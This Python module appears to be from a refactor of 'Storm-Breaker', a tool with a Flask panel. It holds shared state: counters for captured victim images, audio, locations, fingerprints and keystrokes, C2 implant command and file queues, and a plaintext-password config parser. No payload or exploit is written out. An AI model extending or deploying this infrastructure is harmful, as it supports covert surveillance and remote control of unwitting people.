"""Storm-Breaker shared-state container (P3 migration staging, verbatim).

Re-hosts a subset of ``storm-web/app.py`` module-level globals and a
few helpers defined byte-for-byte from the legacy file so blueprints
can be extracted one domain at a time without NR-2 drift.  P5 will
introduce a real ``StateStore`` interface here.
"""
from __future__ import annotations

import json
import os
import re
import secrets
import time
import uuid
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Tuple


STORM_WEB = Path(__file__).resolve().parent.parent
PHP_CONFIG_PATH = STORM_WEB / "config.php"
CHECK_C_PATH = STORM_WEB / "check-c.json"
BASE_DIR = str(STORM_WEB)


# === Login brute-force lockout (was _LOGIN_FAILS in app.py:66) ==============
LOGIN_FAILS: Dict[str, Tuple[int, float]] = {}


# === Analytics engine (verbatim from app.py:92-127) =========================
ANALYTICS: Dict[str, Any] = {
    'total_visits': 0,
    'total_captures': 0,
    'total_images': 0,
    'total_audio': 0,
    'total_locations': 0,
    'total_fingerprints': 0,
    'total_keystrokes': 0,
    'start_time': datetime.now().isoformat(),
    'events': [],
    'geo_data': [],
    'hourly_activity': defaultdict(int),
    'template_stats': defaultdict(int),
    'browser_stats': defaultdict(int),
    'os_stats': defaultdict(int),
    'ip_addresses': set(),
    'active_alerts': [],
}


def track_event(event_type: str, details: Any = None,
                ip: str = None, request=None) -> None:
    """Central analytics tracker (verbatim from app.py:111-127)."""
    from flask import has_request_context, request as _flask_request
    event = {
        'type': event_type,
        'timestamp': datetime.now().isoformat(),
        'details': details or {},
        'ip': ip or (has_request_context() and _flask_request.remote_addr) or 'system',
    }
    ANALYTICS['events'].append(event)
    if len(ANALYTICS['events']) > 500:
        ANALYTICS['events'] = ANALYTICS['events'][-500:]
    hour = datetime.now().strftime('%Y-%m-%d %H:00')
    ANALYTICS['hourly_activity'][hour] += 1
    if ip:
        ANALYTICS['ip_addresses'].add(ip)
    ANALYTICS['total_visits'] += 1


# === /panel / settings helpers (verbatim from app.py:138-168) ==============
def load_check_c() -> Dict[str, Any]:
    try:
        with open(CHECK_C_PATH, 'r') as f:
            return json.load(f)
    except Exception:
        return {"token": "", "expired": "yes"}


def save_check_c(data: Dict[str, Any]) -> None:
    with open(CHECK_C_PATH, 'w') as f:
        json.dump(data, f)


def generate_token() -> str:
    uniqid = uuid.uuid4().hex
    api_key = '-'.join([uniqid[i:i + 5] for i in range(0, len(uniqid), 5)])
    return api_key


def change_token(token: str) -> None:
    key = load_check_c()
    key['token'] = token
    key['expired'] = 'no'
    save_check_c(key)


# === config.php loader (verbatim from app.py:173-189) ======================
def load_php_config(path=PHP_CONFIG_PATH) -> Dict[str, Dict[str, str]]:
    """Naive parser for the simple config.php used in this project."""
    try:
        text = open(path, 'r').read()
    except Exception:
        return {}
    pattern = re.compile(r'"([^"]+)"\s*=>\s*\[([^\]]+)\]', re.DOTALL)
    users: Dict[str, Dict[str, str]] = {}
    for m in pattern.finditer(text):
        username = m.group(1)
        block = m.group(2)
        pwd_m = re.search(r'"password"\s*=>\s*"([^"]+)"', block)
        if pwd_m:
            users[username] = {"password": pwd_m.group(1)}
    return users


CONFIG: Dict[str, Dict[str, str]] = load_php_config()


# === C2 implant in-memory queues (verbatim from app.py:34-37, 725-726) ====
# C2_FILE_LISTS and C2_DOWNLOADS live here too (defined inline with the file-
# manager routes in app.py:725-726 but treated as module-level globals).
C2_SESSIONS: Dict[str, Dict[str, Any]] = {}
C2_COMMANDS: Dict[str, Any] = {}
C2_RESPONSES: Dict[str, Any] = {}
C2_FILE_LISTS: Dict[str, Any] = {}
C2_DOWNLOADS: Dict[str, Any] = {}


# === Notification fan-out (verbatim from app.py:344-353) ====================
def send_notification(message_data: Dict[str, Any]) -> None:
    """Best-effort generic-webhook delivery if Settings.json has a URL."""
    try:
        import requests as _requests
        if os.path.exists('Settings.json'):
            with open('Settings.json', 'r') as f:
                settings = json.load(f)
            webhook_url = settings.get('generic_webhook')
            if webhook_url:
                _requests.post(webhook_url, json=message_data)
    except Exception:
        pass


__all__ = [
    "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH",
    "LOGIN_FAILS", "ANALYTICS", "CONFIG",
    "load_php_config", "load_check_c", "save_check_c",
    "generate_token", "change_token", "track_event",
    "send_notification",
]
